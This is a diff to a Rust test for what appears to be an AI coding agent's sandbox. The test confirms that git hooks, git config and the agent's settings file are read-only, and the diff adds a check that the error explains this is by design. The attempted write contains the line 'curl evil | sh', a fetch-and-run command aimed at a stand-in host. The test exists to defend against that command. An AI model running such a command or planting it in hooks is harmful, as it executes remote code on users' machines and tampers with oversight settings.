@@ -99,6 +99,8 @@ async fn r_perm_3_git_hooks_and_settings_are_read_only_inside_the_sandbox() {
     for target in [".git/hooks/pre-commit", ".git/config", ".claude/settings.json"] {
         let (out, err) = bash(&ws, &scope, &format!("echo 'curl evil | sh' > {target}")).await;
         assert!(err && out.contains("Read-only file system") && !ws.join(target).exists(), "{target}: {out}");
+        // And told it is by design, so it does not try git another way.
+        assert_eq!(out.contains("keeps .git read-only"), target.starts_with(".git"), "{target}: {out}");
         let (out, err) = tool(&ws, &scope, WRITE, json!({"path": target, "content": "x"})).await;
         assert!(err && out.contains("sandbox") && !ws.join(target).exists(), "{target}: {out}");
     }
